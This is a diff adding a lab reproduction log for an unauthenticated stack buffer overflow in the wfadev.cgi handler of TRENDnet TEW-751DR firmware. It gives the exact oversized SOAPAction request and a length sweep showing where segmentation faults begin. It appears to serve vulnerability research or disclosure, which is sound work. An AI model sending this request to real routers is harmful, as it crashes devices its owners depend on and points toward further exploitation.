@@ -1,0 +1,32 @@
+=== C-6  wfadev.cgi SOAPAction -> 4100-byte stack buffer (unauthenticated) ===
+target : TRENDnet TEW-751DR 1.03B01   (733GR ships the same cgibin)
+image  : TEW-751DRv1_(FW1.03B01).zip
+sha256 : fe1168fc2b2bf4744df3a7145eeaf11b2c5272ae502c8f2993e5c614499322ec
+cgibin : e27547940d0ae75233fc6b2b64c50d37fc3b55d4dea9d86bbb86dd448f08a7eb
+host   : lab-host  2026-10-31T11:03:43+08:00
+request: POST /wfadev.cgi?service=WFAWLANConfig1  (SOAPAction: 'A'*N + '#SetAPSettings')
+single variable: N (SOAPAction prefix length)
+
+########## CONTROL   N=26 (a normal action string) ##########
+    HTTP/1.1 200 OK
+    <u:SetAPSettingsResponse xmlns:u="AAAAAAAAAAAAAAAAAAAAAAAAAA" />
+    EXIT=0
+
+########## CONTROL   N=3900 (still inside the buffer) ##########
+    EXIT=0   <- CGI returns normally
+
+########## TRIGGER   N=4000 (overflows the 4100-byte buffer) ##########
+    uncaught target signal 11 (Segmentation fault) - core dumped
+    EXIT=139
+
+########## BOUNDARY   length sweep ##########
+    N      result
+    3860   EXIT=0
+    3900   EXIT=0
+    3940   EXIT=139  <- SIGSEGV
+    3960   EXIT=139  <- SIGSEGV
+    3980   EXIT=139  <- SIGSEGV
+    4000   EXIT=139  <- SIGSEGV
+    4200   EXIT=139  <- SIGSEGV
+
+[replay done] only N changed between the requests
